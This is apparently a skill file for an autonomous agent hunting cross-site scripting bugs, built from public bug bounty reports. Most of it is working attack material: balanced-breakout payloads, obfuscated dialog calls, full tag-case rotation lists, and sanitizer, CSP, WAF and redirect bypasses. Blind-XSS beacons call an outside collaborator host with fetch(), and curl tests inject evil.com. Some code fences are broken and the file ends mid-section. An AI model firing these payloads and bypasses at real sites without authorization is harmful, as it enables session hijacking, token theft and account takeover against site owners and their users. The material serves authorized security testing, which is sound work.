---
name: reflected-xss
description: Hunting skill for xss vulnerabilities. Built from 174 public bug bounty reports. Use when hunting xss on any target. For markup injection that reflects raw HTML but does NOT execute JavaScript (no `<script>`/event-handler execution), see hunt-html-injection — escalate here once script execution is possible.
sources: github, hackerone_public
report_count: 174
---

## Autonomous Testing Priority

**Verify reflection before claiming XSS — encoding is everything.**

Your payload must appear in the response body with angle brackets UNESCAPED. `<script>` is XSS. `&lt;script&gt;` is safe encoding — not vulnerable.

**JavaScript dialog methods: `alert(1)`, `confirm(1)`, `prompt(1)`.** These three dialog calls are the canonical proof set. All of them are visible JavaScript dialogs that block the page until handled, which makes the finding observable to a human operator and cancellable mid-run.

| Primitive | Dialog behavior | Use when |
|---|---|---|
| `alert(1)` | Notice with an OK button | Default first probe; cheapest confirmation |
| `confirm(1)` | OK / Cancel, returns boolean | `alert` is blacklisted or filtered but `confirm` is not |
| `prompt(1)` | Text-input dialog, returns string | `alert` and `confirm` are both blocked, or input handling is part of the test |

If one primitive is filtered, **try the next before concluding "not vulnerable"** — naive blacklists block `alert(` and forget `confirm(` / `prompt(`. Escaped or stripped output is still safe; a missing dialog with raw output means the sink did not execute and you need a different context. If the reflection is fully entity-encoded (`&lt;`, `&quot;`, `&#039;`), the parameter is a dead end — see **HTML-Entity Encoding** and skip it.

If **all three** are blocked or filtered, do not abandon the sink: keep the same trio and obfuscate the name/call syntax per **Dialog Fallback** below. If the *tag name itself* is what is blocked (not the dialog name), rotate the casing per **Tag-Name Case Variations** first — that is a cheaper bypass than full obfuscation.

**Canary discipline:** when the page contains example payloads (`alert(1)`, `alert('XSS')`), substitute a unique number, e.g. `alert(778815)` / `confirm(778815)` / `prompt(778815)`, so your execution is distinguishable from decoys. Use the literal `1` when there is no decoy noise, and always keep the dialog function the proof requires.

**Try these contexts in order:**

0. **Context balancing prefix — put `'"<>` before every tag-based payload.** `'` closes a single-quoted attribute or JS string, `"` closes a double-quoted one, and `<` `>` break out of / stress the tag context, so an unknown reflection context is neutralized before `<script>` or `<svg>` is parsed. This is the default probe shape; the plain payload (no prefix) is the fallback once the context is known:
   ```
   ?q='"<><script>alert(1)</script>
   ?q='"<><script>confirm(1)</script>
   ?q='"<><script>prompt(1)</script>
   ?utm_source='"<><svg onload=alert(1)>
   ```
   If the reflected prefix comes back as `&quot;` / `&#39;` / `&lt;`, output encoding is active — check whether only some characters are escaped before escalating, and if the whole set is escaped treat the parameter as encoded and move on (see **HTML-Entity Encoding**).

1. **Inline script injection** (works when HTML context allows new tags):
   ```
   '"<><script>alert(1)</script>
   '"<><script>confirm(1)</script>
   '"<><script>prompt(1)</script>
   ```
   Confirmed when the balanced payload appears literally (not HTML-encoded) in the response **and** a dialog actually fires in a browser.

   If `<script>` is stripped but the rest of the payload reflects, rotate the tag casing (`<ScRiPt>`, `<sCrIpT>`, `<SCRIPT>`) before changing technique — see **Tag-Name Case Variations**.

2. **Attribute event injection** (when `<` is filtered but attributes are injectable) — the leading `"` of the balancing prefix is what closes a double-quoted attribute; use the bare quote form when `<`/`>` are stripped:
   ```
   '"<>" onmouseover="alert(1)
   " onmouseover="alert(1)
   " onerror="confirm(1)
   " onload="prompt(1)
   ```

3. **URL/href context:**
   ```
   javascript:alert(1)
   javascript:confirm(1)
   javascript:prompt(1)
   ```

**Distinguishing success from failure:**
- **Vulnerable:** the balanced payload (`'"<><script>alert(1)`) comes back unescaped **and** the dialog fires in a real browser
- **Filtered/safe:** response contains `&lt;script&gt;` or `&#x3C;script&#x3E;` — properly encoded. If the full set (`&amp;` `&quot;` `&#039;` `&lt;` `&gt;`) is encoded, this is `htmlspecialchars()`-class encoding: skip this parameter and move to the next (see **HTML-Entity Encoding** for the three exceptions worth a quick check).
- **Blocked:** response is an error, the reflected value is absent, or the page renders without a dialog. Before concluding, rotate tag casing (**Tag-Name Case Variations**) and, if all three dialog names are filtered, use **Dialog Fallback**.

**Visible, cancellable dialog runs (ego-browser / guarded browser):** dialogs only prove execution if the operator can see them and stop the run. Keep the dialog on screen long enough to be observed, then handle it explicitly — never leave it blocking the tab:

```js
await page.goto(pocUrl);
// The dialog may surface here or in a click/action receipt:
const info = await page.info();
// Then choose one, exactly once:
await page.dismissDialog();               // for the user who wants to cancel
await page.acceptDialog();                // OK / close
await page.acceptDialog("text");          // prompt() input
```

For `confirm(1)` and `prompt(1)` the control matters: `acceptDialog()` returns truthy/enters the value, `dismissDialog()` returns false/cancels. If the operator takes control or asks to cancel, stop and do not route around it.

**For stored XSS:** inject into a field that other pages display (comments, usernames, ticket titles). Then fetch the rendering page and check for unescaped payload. The payload executes when any user views that page — higher severity than reflected.

---

## HTML-Entity Encoding — `htmlspecialchars()` means skip the parameter

PHP `htmlspecialchars()` — and the equivalent auto-escapers in Rails ERB, Django/Jinja autoescape, Go `html/template`, Python `html.escape(quote=True)`, ASP.NET `<%: %>` — converts HTML metacharacters into entities:

| Input | Output | Escaped? |
|---|---|---|
| `&` | `&amp;` | yes |
| `"` | `&quot;` | yes |
| `'` | `&#039;` (or `&apos;`) | only with `ENT_QUOTES` (PHP ≥ 8.1 default); **raw** under `ENT_COMPAT` |
| `<` | `&lt;` | yes |
| `>` | `&gt;` | yes |

**The rule: when a parameter reflects with all five encoded, stop payloading it. Mark it `encoded (htmlspecialchars)`, skip that parameter, and move to the next parameter / endpoint / sink.** This is correct output encoding, not a filter to reverse-engineer. Two probes are enough to decide (baseline canary + one breakout); spending a payload list on it is how a run burns out with zero findings.

**Probe with one request:** send `aaa"bbb'ccc<ddd>eee&fff` and look at the reflection. `aaa&quot;bbb&#039;ccc&lt;ddd&gt;eee&amp;fff` = `htmlspecialchars($x, ENT_QUOTES)` → skip. `aaa&quot;bbb'ccc&lt;ddd&gt;eee&amp;fff` (single quote still raw) = `ENT_COMPAT` → exception 1 below.

**Three 30-second exceptions — test these before you skip:**

1. **`'` comes back raw.** Pre-8.1 PHP defaults to `ENT_COMPAT`, which encodes `"` but not `'`, and an explicit `ENT_COMPAT` does the same today. Single-quoted attributes are then still breakable:
   ```html
   ' onmouseover='alert(1)
   ' autofocus onfocus='alert(1)
   ```
2. **The value sits in an unquoted attribute, a backtick attribute, or a URL attribute (`href`, `src`, `action`, `formaction`).** `htmlspecialchars()` never encodes `` ` ``, `=`, `/`, `:`, `(`, `)`, so these survive unchanged:
   ```html
   x onmouseover=alert(1)
   ` onmouseover=alert(1)
   javascript:alert(1)
   data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
   ```
   A `javascript:` URL or a base64 `data:` URI needs none of the five escaped characters, so escaping them changes nothing.
3. **The entity gets decoded later.** If the encoded value is stored and a downstream template calls `html_entity_decode()`, or client JS reads it and assigns to `innerHTML`, the entities turn back into live markup. Check the stored / re-rendered page, not just the first response.

If none of that applies, skip it. Encoded output on one parameter says nothing about the next parameter, endpoint, header sink, or stored field.

---

## Dialog Fallback — when `alert` / `confirm` / `prompt` are all blocked

When the app strips, encodes, or WAF-blocks all three dialog names but the sink still executes JavaScript, keep the same dialog and obfuscate the **name** and/or **call syntax**. Payload families below are the ones produced by `rix4uni/xss-payloads-generator` (https://github.com/rix4uni/xss-payloads-generator).

| Family | `alert(1)` example | Executes in | Needs `eval` |
|---|---|---|---|
| Decimal entity — name | `<img src=x onerror="&#97;lert(1)">` | HTML attribute / text | no |
| Decimal entity — call | `<img src=x onerror="alert&#40;1&#41;">` | HTML attribute / text | no |
| Hex entity | `<img src=x onerror="&#x61;lert(1)">`, `&#x000061;lert(1)` | HTML attribute / text | no |
| Unicode identifier escape | `<script>\u0061lert(1)</script>`, `ale\u0072t(1)` | JS source (script / handler) | no |
| Bracket + concat | `<script>window['ale'+'rt'](1)</script>` | JS source | no |
| String concatenation | `<script>eval("a"+"lert(1)")</script>` | JS source | yes |
| Base64 + `atob` | `<script>eval(atob('YWxlcnQoMSk='))</script>` | JS source | yes |
| URL decode | `<script>eval(decodeURIComponent('alert%281%29'))</script>` | JS source | yes |
| `fromCharCode` | `<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>` | JS source | yes |
| Reversed string | `<script>eval('trela'.split('').reverse().join('')+'(1)')</script>` | JS source | yes |
| Variable obfuscation | `<script>var _='alert';eval(_+'(1)')</script>` | JS source | yes |
| Function constructor | `<script>new Function('alert(1)')()</script>` | JS source | yes |
| Mixed encoding | `<script>eval('\u0061\u006c'+String.fromCharCode(101,114,116)+'(1)')</script>` | JS source | yes |

**Same families for the other two dialogs** (swap the encoded constants):

| Dialog | Base64 | `fromCharCode` codes | Reversed |
|---|---|---|---|
| `confirm(1)` | `Y29uZmlybSgxKQ==` | `99,111,110,102,105,114,109,40,49,41` | `mrifnoc` |
| `prompt(1)` | `cHJvbXB0KDEp` | `112,114,111,109,112,116,40,49,41` | `tpmorp` |

**Selection order:** entity / unicode / bracket families first (no `eval`, survive a strict `script-src`) → concat / `atob` / `fromCharCode` / reverse / variable / `Function` (all `eval`-class) → mixed encoding when a WAF normalizes single-family payloads.

**Context rule (this breaks more payloads than filters do):** HTML entities (`&#97;`, `&#x61;`, `&#40;`) are decoded by the HTML parser in attributes, text, and `srcdoc` — **not** inside `<script>`, whose content is raw text. Unicode identifier escapes (`\u0061lert`) work in JS source, **not** in HTML text/attributes. Pick the family that matches the sink.

**CSP rule:** if the response has a CSP without `unsafe-eval`, every `eval` / `Function` / `atob`-decoded payload is dead. Stay in the no-eval rows and change the sink instead (event handler, `javascript:` URL, SVG `onload`).

---

## Tag-Name Case Variations — when `<script>` (or the whole tag) is blocked

**Rule:** HTML tag names are ASCII case-insensitive. `<ScRiPt>`, `<sCrIpT>` and `<SCRIPT>` all parse to the same `script` element, and the same is true of the closing tag (`</sCrIpT>` closes `<ScRiPt>`). Attribute **names** are case-insensitive too (`ONERROR=`, `OnLoAd=`), but the JavaScript inside them is case-sensitive — never vary `alert`/`confirm`/`prompt`, the document object, or property names.

So when a blocklist matches `<script>` literally (a case-sensitive regex/WAF rule), rotate the casing. Same for `<svg>`, `<img>`, `<image>`, `<audio>`, `<video>` and their event-handler attribute names.

```html
'"<><ScRiPt>alert(1)</sCrIpT>
'"<><sCrIpT>confirm(1)</ScRiPt>
'"<><SCRIPT>prompt(1)</SCRIPT>
'"<><IMG SRC=x OnErRoR=alert(1)>
'"<><ImAgE src=x ONERROR=alert(1)>
'"<><SvG OnLoAd=alert(1)>
'"<><SvG/OnLoAd=alert(1)>
'"<><AuDiO src=x OnErRoR=alert(1)>
'"<><ViDeO src=x OnErRoR=alert(1)>
```

**Complete rotation lists** (use them left-to-right; the first entry is the all-lowercase baseline).

**`<script>` — 64 variants** (primary — executes inline JS)
```html
<script>
<Script>
<sCript>
<SCript>
<scRipt>
<ScRipt>
<sCRipt>
<SCRipt>
<scrIpt>
<ScrIpt>
<sCrIpt>
<SCrIpt>
<scRIpt>
<ScRIpt>
<sCRIpt>
<SCRIpt>
<scriPt>
<ScriPt>
<sCriPt>
<SCriPt>
<scRiPt>
<ScRiPt>
<sCRiPt>
<SCRiPt>
<scrIPt>
<ScrIPt>
<sCrIPt>
<SCrIPt>
<scRIPt>
<ScRIPt>
<sCRIPt>
<SCRIPt>
<scripT>
<ScripT>
<sCripT>
<SCripT>
<scRipT>
<ScRipT>
<sCRipT>
<SCRipT>
<scrIpT>
<ScrIpT>
<sCrIpT>
<SCrIpT>
<scRIpT>
<ScRIpT>
<sCRIpT>
<SCRIpT>
<scriPT>
<ScriPT>
<sCriPT>
<SCriPT>
<scRiPT>
<ScRiPT>
<sCRiPT>
<SCRiPT>
<scrIPT>
<ScrIPT>
<sCrIPT>
<SCrIPT>
<scRIPT>
<ScRIPT>
<sCRIPT>
<SCRIPT>
```

**`<svg>` — 8 variants** (onload)
```html
<svg>
<Svg>
<sVg>
<SVg>
<svG>
<SvG>
<sVG>
<SVG>
```

**`<img>` — 8 variants** (onerror)
```html
<img>
<Img>
<iMg>
<IMg>
<imG>
<ImG>
<iMG>
<IMG>
```

**`<img2>` — 8 variants** (unknown element — filter probe only)
```html
<img2>
<Img2>
<iMg2>
<IMg2>
<imG2>
<ImG2>
<iMG2>
<IMG2>
```

**`<img3>` — 8 variants** (unknown element — filter probe only)
```html
<img3>
<Img3>
<iMg3>
<IMg3>
<imG3>
<ImG3>
<iMG3>
<IMG3>
```

**`<image>` — 32 variants** (aliased to `img` by the HTML parser)
```html
<image>
<Image>
<iMage>
<IMage>
<imAge>
<ImAge>
<iMAge>
<IMAge>
<imaGe>
<ImaGe>
<iMaGe>
<IMaGe>
<imAGe>
<ImAGe>
<iMAGe>
<IMAGe>
<imagE>
<ImagE>
<iMagE>
<IMagE>
<imAgE>
<ImAgE>
<iMAgE>
<IMAgE>
<imaGE>
<ImaGE>
<iMaGE>
<IMaGE>
<imAGE>
<ImAGE>
<iMAGE>
<IMAGE>
```

**`<image2>` — 32 variants** (unknown element — filter probe only)
```html
<image2>
<Image2>
<iMage2>
<IMage2>
<imAge2>
<ImAge2>
<iMAge2>
<IMAge2>
<imaGe2>
<ImaGe2>
<iMaGe2>
<IMaGe2>
<imAGe2>
<ImAGe2>
<iMAGe2>
<IMAGe2>
<imagE2>
<ImagE2>
<iMagE2>
<IMagE2>
<imAgE2>
<ImAgE2>
<iMAgE2>
<IMAgE2>
<imaGE2>
<ImaGE2>
<iMaGE2>
<IMaGE2>
<imAGE2>
<ImAGE2>
<iMAGE2>
<IMAGE2>
```

**`<image3>` — 32 variants** (unknown element — filter probe only)
```html
<image3>
<Image3>
<iMage3>
<IMage3>
<imAge3>
<ImAge3>
<iMAge3>
<IMAge3>
<imaGe3>
<ImaGe3>
<iMaGe3>
<IMaGe3>
<imAGe3>
<ImAGe3>
<iMAGe3>
<IMAGe3>
<imagE3>
<ImagE3>
<iMagE3>
<IMagE3>
<imAgE3>
<ImAgE3>
<iMAgE3>
<IMAgE3>
<imaGE3>
<ImaGE3>
<iMaGE3>
<IMaGE3>
<imAGE3>
<ImAGE3>
<iMAGE3>
<IMAGE3>
```

**`<audio>` — 32 variants** (onerror)
```html
<audio>
<Audio>
<aUdio>
<AUdio>
<auDio>
<AuDio>
<aUDio>
<AUDio>
<audIo>
<AudIo>
<aUdIo>
<AUdIo>
<auDIo>
<AuDIo>
<aUDIo>
<AUDIo>
<audiO>
<AudiO>
<aUdiO>
<AUdiO>
<auDiO>
<AuDiO>
<aUDiO>
<AUDiO>
<audIO>
<AudIO>
<aUdIO>
<AUdIO>
<auDIO>
<AuDIO>
<aUDIO>
<AUDIO>
```

**`<video>` — 32 variants** (onerror)
```html
<video>
<Video>
<vIdeo>
<VIdeo>
<viDeo>
<ViDeo>
<vIDeo>
<VIDeo>
<vidEo>
<VidEo>
<vIdEo>
<VIdEo>
<viDEo>
<ViDEo>
<vIDEo>
<VIDEo>
<videO>
<VideO>
<vIdeO>
<VIdeO>
<viDeO>
<ViDeO>
<vIDeO>
<VIDeO>
<vidEO>
<VidEO>
<vIdEO>
<VIdEO>
<viDEO>
<ViDEO>
<vIDEO>
<VIDEO>
```

> The `<video>` list above is the canonical 32-entry rotation; if a variant looks off, regenerate rather than guess:
> ```bash
> python3 - <<'EOF'
> for tag in ("script","svg","img","img2","img3","image","image2","image3","audio","video"):
>     idx=[i for i,c in enumerate(tag) if c.isalpha()]
>     for m in range(1<<len(idx)):
>         t=list(tag)
>         for b,p in enumerate(idx):
>             if m>>b&1: t[p]=t[p].upper()
>         print("<"+"".join(t)+">")
>     print()
> EOF
> ```

**Field notes (verified in headless Chrome, local parser test):**

- Mixed-case `<script>`, `<svg onload>`, `<img onerror>`, `<image onerror>`, `<audio onerror>`, `<video onerror>` all **executed** — case-only rotation is a real parser-level bypass.
- `<image>` is the historical HTML alias for `<img>`, so `<ImAgE src=x ONERROR=…>` fires exactly like `<img>`. Inside inline SVG, `<image>` is a real SVG element — prefer `onload` or a nested `<script>` there and test per browser rather than assuming `onerror`.
- `<img2>`, `<img3>`, `<image2>`, `<image3>` are **not HTML elements**. The browser creates `HTMLUnknownElement` objects and their `onerror` never fires (tested: title unchanged). Use them only as **case-sensitivity probes** — if `<ImG2 src=x onerror=…>` comes back blocked/encoded while `<ImG2>` alone is reflected, the filter is matching tag *names*; if all of them pass through untouched, the filter isn't tag-based at all (look at attribute/entity filters instead).
- `<svg/onload=…>` (slash instead of space) additionally defeats regexes written as `<svg onload`.
- If the filter **lowercases or normalizes the whole input** before matching, no casing variant survives — pivot to the **Dialog Fallback** entity/`\u`/`atob` families, or to an attribute-only sink (no tag name to match).

---

## Crown Jewel Targets

XSS is high-value when it combines **privileged context + persistent delivery + scope escalation**. The highest payouts come from:

- **Admin panels and authenticated dashboards** (e.g., `*/admin`, `*/settings`) — attacker can hijack sessions with elevated privileges, exfiltrate tokens, or pivot to account takeover
- **Payment/financial flows** (`paypal.com`, checkout pages, currency converters) — XSS here enables credential harvesting and financial fraud at scale
- **Stored XSS in collaborative features** (wikis, markdown renderers, issue trackers, RDoc, labels, tags) — one payload infects every viewer, multiplying impact
- **SSO/signin pages** (e.g., `paypal.com/signin`) — XSS here is critical because it can steal auth tokens across the entire platform
- **Shared SaaS tenant surfaces** (`*.myshopify.com`, `api.collabs.*`) — XSS in one tenant's context can bleed across tenant boundaries
- **Help/documentation sites** (`help.shopify.com`) — lower severity individually, but often have looser sanitization and trusted user perception
- **SVG/file upload endpoints** — frequently bypasses CSP and sanitization simultaneously

**Asset types that pay most:** Main product domains > Admin subdomains > API endpoints > Marketing/help sites

---

## OOB-Or-It-Didn't-Happen Gate (Blind / Stored XSS)

For blind and stored XSS — claims require an out-of-band confirmation, the same as blind SSRF. The OOB receiver fires when the payload actually executes in a browser somewhere (an admin reviewing logs, a SOC analyst opening a ticket, an email rendering a stored payload).

### What is NOT confirmation

- ASP.NET request validator rejected your `<` and returned a different status code → not XSS, that's WAF noise.
- Your payload appears in the response body URL-encoded or HTML-encoded → not XSS, that's correct output encoding.
- The form action attribute contains your payload string as `%22onclick%3D…` → not XSS, the browser does NOT decode URL encoding inside HTML attribute values; the `%22` stays as literal `%22` in the DOM.
- Your `<script>` tag appears in the response as `&lt;script&gt;` → not XSS, that's escaping.

### What IS confirmation

- A request to your unique Collaborator subdomain (e.g., `bxss-err-<random>.<collab>.oastify.com`) arrives in the OOB listener after your payload was stored / reflected / queued.
- For stored XSS: the request arrives **hours or days later** when an admin views the affected resource. Plant payloads early in the engagement and keep the listener open.
- The User-Agent of the firing request is a browser (Mozilla/Chrome), not the server's own backend HTTP client.

### Where to plant blind-XSS beacons

Any field whose value might be viewed in an admin UI / log viewer / email / report later:
- Error messages (`?ErrorMessage=<svg onload=fetch('//bxss-<tag>.<collab>/x')>`)
- Auth-flow source params (`?Source=`, `?ReturnUrl=`)
- Login form username field (admin may view audit logs of failed logins)
- User-Agent header (some SOC consoles render UA as HTML)
- Referer header (some analytics dashboards render Referer as HTML)
- Email addresses on registration / contact forms
- File-upload filenames

**Always sub-tag the Collaborator subdomain by sink** so callbacks identify which field fired.

**Lesson from a authorized engagement:** 10 blind-XSS Collaborator beacons planted across `ErrorMessage`, `Source`, the Authentication.asmx username field, User-Agent header, Referer header, and request paths. Zero callbacks over a 10-minute polling window. Conclusion: the SharePoint SOC views logs / errors in tooling that does not render HTML, AND the ASP.NET request validator blocks `<` in query strings before the payload reaches storage. Stored-XSS claim correctly retracted.

---

## Attack Surface Signals

**URL Patterns:**
```
/admin*
/settings*
/wiki*
/reports*
?utm_source=
?redirect=
?q=
?search=
?callback=
?return_url=
/render*
/preview*
/documentation*
```

**Response Headers (weak defense signals):**
```
Content-Type: text/html (without nosniff)
Content-Security-Policy: (absent or using unsafe-inline)
Content-Type: image/svg+xml (CSP often not applied)
X-XSS-Protection: 0
```

**JS Patterns in source that signal DOM XSS:**
```javascript
document.write(
innerHTML =
location.hash
location.search
location.href
document.referrer
eval(
setTimeout(string,
setInterval(string,
$.html(
$(location
```

**Tech Stack Signals:**
- Rails applications using `html_safe`, `raw`, `translate`, Action Text, or ActionView sanitize helpers
- GitLab/GitHub markdown pipelines (Banzai, Kramdown, RDoc, Kroki)
- Applications allowing SVG uploads or rendering
- Sites using `style` tag in allowlists
- Kroki/Mermaid/PlantUML diagram rendering endpoints
- Cache layers in front of authenticated pages (cache poisoning vector)

---

## Step-by-Step Hunting Methodology

1. **Map all reflection points** — Spider the target and identify every place user input appears in HTML output. Prioritize: URL parameters, form fields, HTTP headers (User-Agent, Referer), file upload names/contents, and API response fields rendered in UI.

2. **Classify by type** — Determine if each reflection is Reflected (URL param → response), Stored (database → later rendering), or DOM-based (JS reads URL/storage → DOM sink). Each requires different payload delivery.

3. **Probe sanitizer behavior** — Send harmless canary strings first: `aaa"bbb'ccc<ddd>eee&fff` to determine which characters are escaped. Observe if output is in HTML context, attribute context, JS context, or URL context.

   **Marker Discipline:** When choosing canary strings, they MUST be unique random alphanumeric strings (8+ chars, no English words, no protocol keywords). Bad markers: `test`, `marker`, `evil`, `attacker`, `payload`, `javascript`, `script`. Good markers: `cpmark987abc`, `x4hd2k9pq`, `__ZZ_MARKER_<random>_ZZ__`. Before claiming reflection, search the baseline (no-marker) response for the marker — if it appears naturally in the page (e.g., the word `javascript` is in every page's help-link hrefs), it's a false-positive trap and you need a different marker. This single check catches 80% of false-positive reflection reports.

   **Then name the encoder from that canary and decide in one request:**
   - **All of `& " ' < >` converted** → `htmlspecialchars()` / framework autoescape. **Skip this parameter, move to the next one** — see **HTML-Entity Encoding** for the three exceptions (`'` still raw under `ENT_COMPAT`, URL/unquoted attribute sinks, entity decoded later).
   - **Only `<` `>` converted** (quotes raw) → attribute breakout is still live: `" onmouseover="alert(1)` / `' onmouseover='alert(1)`.
   - **Nothing converted** → go straight to the dialog trio with the `'"<>` prefix.

4. **Test allowlisted tag combinations** — If a sanitizer is in use, probe for dangerous tag combos: `<math>+<style>`, `<svg>+<style>`, `<iframe srcdoc>`, `<style>` with expressions.

5. **Hunt SVG and file upload vectors** — Upload SVG files containing `<script>` tags. Check Content-Type response header. Test if CSP applies to SVG responses separately.

6. **Test markdown/documentation renderers** — In wiki, README, or doc fields, try: `[text](javascript:alert(1))`, inline HTML injection, Kroki/Mermaid payloads, RDoc `link:javascript:` syntax.

7. **Check redirect parameters** — Test `?redirect=javascript:alert(1)` and `?return_url=//evil.com` — look for single-click XSS via improper redirect sanitization.

8. **Probe UTM and analytics parameters** — `utm_source`, `utm_medium`, `utm_campaign` are often reflected without sanitization on marketing pages.

9. **Test CSP bypass opportunities** — If CSP is present, look for: JSONP endpoints on allowed domains, `unsafe-inline` in style-src, SVG that bypasses script-src, script gadgets on whitelisted CDNs.

10. **Attempt stored XSS in profile/metadata fields** — Username, bio, tag names, label colors, organization names — these render in many contexts and often have weaker validation.

11. **Check cache poisoning** — Test if reflected XSS payloads can be cached and served to other users (especially on CDN-fronted pages), transforming reflected XSS into stored-equivalent.

12. **Validate in target browser** — Always confirm in a real browser before reporting, and use `alert(1)`, `confirm(1)`, or `prompt(1)` so the execution produces a visible dialog. Many payloads echo back in Burp but fail to execute in a real browser due to CSP, output encoding, framework auto-escaping, context mismatch, WAF normalization, or browser HTML-parsing differences. If `alert` is filtered, retry the same context with `confirm` and `prompt` before abandoning it. (Note: Chrome's XSS Auditor was removed in Chrome 78 / Oct 2019 and no shipping browser has one — never attribute a failed PoC to an "XSS auditor".)

---

## Payload & Detection Patterns

**Basic context probing:**
```html
aaa"bbb'ccc<ddd>eee`fff
```

**Reflected XSS — URL parameter baseline (dialog trio):**
```
?q=<script>alert(1)</script>
?q='"<><script>alert(1)</script>
?q='"<><script>confirm(1)</script>
?q='"<><script>prompt(1)</script>
?utm_source='"<><svg onload=alert(1)>
?redirect=javascript:alert(1)
```
The `'"<>` prefix is the default balance probe (see Autonomous Testing Priority); keep it on the script/SVG payloads. Swap `alert` → `confirm` → `prompt` when a blacklist blocks the previous one; the surrounding breakout stays identical.

**Balanced breakout (default — quote + bracket balancing):**
```html
'"<><script>alert(1)</script>
'"<><script>confirm(1)</script>
'"<><script>prompt(1)</script>
'"<><svg onload=alert(1)>
```

**Dialog fallback — all three names blocked/filtered:**
```html
'"<><img src=x onerror="&#97;lert(1)">
'"<><img src=x onerror="&#99;onfirm(1)">
'"<><img src=x onerror="&#112;rompt(1)">
'"<><script>\u0061lert(1)</script>
'"<><script>eval(atob('YWxlcnQoMSk='))</script>
```
Use the entity rows in HTML/attribute sinks, the `\u0061`/`eval` rows in script sinks; see Dialog Fallback for the full family table.

**Attribute context escapes:**
```html
" onmouseover="alert(1)
' onmouseover='alert(1)
`onmouseover=alert(1)
```

**SVG-based (CSP bypass):**
```html
<svg xmlns="http://www.w3.org/2000/svg">
  <script>alert(document.domain)</script>
</svg>
```

**Sanitizer bypass — math+style combo:**
```html
<math><style><img src=x onerror=alert(1)></style></math>
```

**Sanitizer bypass — svg+style combo:**
```html
<svg><style><img src=x onerror=alert(1)></style></svg>
```

**Markdown/RDoc javascript: link:**
```markdown
[Click me](javascript:alert(document.domain))
```

**Kroki/diagram injection:**
````text
```kroki
plantuml
@startuml
:<script>alert(1)</script>;
@enduml
```
````

**DOM XSS via hash/search:**
```javascript
// In browser console to test sink
location.hash = '#"><img src=x onerror=alert(1)>'
location.href = 'https://target.com/page#<script>alert(1)</script>'
```

**Grep patterns for source review:**
```bash
# Find dangerous sinks in JS
grep -rn "innerHTML\|document\.write\|eval(\|setTimeout(\|location\.hash\|location\.search" --include="*.js"

# Find unsafe Rails helpers
grep -rn "html_safe\|raw(\|sanitize\|translate" --include="*.erb" --include="*.rb"

# Find reflected params in responses
grep -i "utm_source\|utm_medium\|redirect\|return_url\|callback\|next" --include="*.html" -r
```

**Curl to detect reflection:**
```bash
curl -sk "https://target.com/search?q=XSSCANARY" | grep -i "XSSCANARY"
curl -sk "https://target.com/page?utm_source=XSSCANARY" | grep -i "XSSCANARY"
```

**Cache poisoning test:**
```bash
# Send payload then fetch with clean session to see if cached
curl -sk "https://target.com/page?param=<script>alert(1)</script>" -H "X-Forwarded-Host: evil.com"
curl -sk "https://target.com/page" | grep -i "evil.com"
```

---

## Common Root Causes

1. **Trusting `html_safe` in Rails** — Developers mark strings as safe after partial sanitization, or chain `.html_safe` on user-supplied data without full sanitization.

2. **Allowlist sanitizers with dangerous tag combinations** — Allowing `style` alongside `math` or `svg` creates mXSS (mutation XSS) opportunities even when individual tags seem harmless.

3. **Third-party rendering pipelines** — Markdown-to-HTML pipelines (Banzai, Kramdown, Kroki) introduce XSS when diagram/rendering engines aren't sandboxed and output isn't re-sanitized.

4. **Reflecting URL parameters without encoding** — UTM params, redirect URLs, and search terms are reflected in page HTML or JS without proper HTML-encoding, especially on marketing/help pages that are treated as lower-security.

5. **SVG treated as non-script content** — Developers apply CSP to HTML responses but forget that `image/svg+xml` responses can execute JavaScript and often aren't covered by the same CSP header.

6. **Incomplete sanitizer patches** — CVE-patched sanitizers are bypassed by slight variations (e.g., CVE-2022-32209's incomplete fix demonstrates that sanitizer logic is difficult to get right, creating bypass chains).

7. **`javascript:` scheme not blocked in href/src** — Link renderers (RDoc, Markdown) fail to block `javascript:` URLs in href attributes, treating them as valid external links.

8. **Cache layers storing authenticated user input** — CDN or reverse proxy caches store responses containing user-controlled XSS payloads, serving them to subsequent unauthenticated users.

9. **File upload without Content-Type enforcement** — Accepting SVG or HTML files and serving them without forcing `Content-Disposition: attachment` or overriding Content-Type.

10. **Translation helper XSS** — Rails `translate`/`t()` helper marks translation strings as HTML-safe and interpolates user input, enabling injection through locale keys.

---

## Bypass Techniques

**CSP Bypass:**
- SVG uploads bypass script-src because `image/svg+xml` responses may not inherit the page's CSP
- Find JSONP endpoints on whitelisted domains (`*.googleapis.com`, `*.cloudflare.com`)
- Use `<base>` tag injection to redirect script sources
- Exploit `unsafe-eval` or `unsafe-inline` in style-src to execute CSS-based attacks
- `<link rel=preload>` or `<meta http-equiv>` gadgets to bypass strict policies

**Sanitizer Bypasses:**
- **mXSS (Mutation XSS):** Inject HTML that's safe when parsed by sanitizer but mutates when re-parsed by browser (e.g., `<math><style><img onerror=...>`)
- **Tag combination attacks:** `<svg>` + `<style>` or `<math>` + `<style>` create parsing ambiguity
- **Attribute quoting variations:** `onmouseover=alert(1)` without quotes, backtick delimiters
- **HTML entity encoding:** `&#106;avascript:` or `&#x6A;avascript:` in href values
- **Protocol variations:** `javascript:`, `vbscript:`, `data:text/html`

**Filter Evasion:**
```html
<!-- Case variation — full rotation lists in "Tag-Name Case Variations" -->
<ScRiPt>alert(1)</ScRiPt>
<IMG SRC=x OnErRoR=alert(1)>
<SvG/OnLoAd=alert(1)>
```
<!-- Null bytes (legacy/weak — null bytes rarely survive modern HTTP/HTML parsing; low success, don't rely on it) -->
<scr\x00ipt>alert(1)</scr\x00ipt>
<!-- Tag breaking -->
<svg/onload=alert(1)>
<!-- Event handler alternatives -->
<body onpageshow=alert(1)>
<input autofocus onfocus=alert(1)>
<details open ontoggle=alert(1)>
```

**WAF Bypass:**
```javascript
// Obfuscated payloads
<svg onload=eval(atob('YWxlcnQoMSk='))>
// String splitting
<script>ale\u0072t(1)</script>
// HTML5 event handlers that WAFs miss
<video src=x onerror=alert(1)>
<audio src=x onerror=alert(1)>
```

**Redirect-based XSS bypass:**
```
?next=javascript://%0aalert(1)
?next=javascript&colon;alert(1)
?redirect=//evil.com/%0d%0a%0d%0a<script>alert(1)</script>
```

**AngularJS client-side template injection (CSTI) & sandbox escapes:**
- *Detect:* the page uses AngularJS (look for `ng-app`/`ng-controller` attributes, `angular.js`/`angular.min.js`, or `{{ }}` interpolation). Probe a reflected param with `{{7*7}}` — if it renders `49` (not the literal text), the value is evaluated as an Angular expression. Always drive the `browser` tool so the expression actually evaluates.
